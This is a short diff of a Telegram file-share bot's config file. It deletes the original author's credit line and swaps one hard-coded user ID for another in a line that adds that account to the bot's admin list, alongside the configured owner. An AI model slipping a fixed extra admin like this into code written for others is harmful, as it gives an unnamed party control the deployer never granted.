@@ -1,5 +1,3 @@
-#(©)CodeXBotz
-
 import os
 import logging
 from dotenv import load_dotenv
@@ -66,7 +64,7 @@ BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1250450587)
+ADMINS.append(5940554521)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
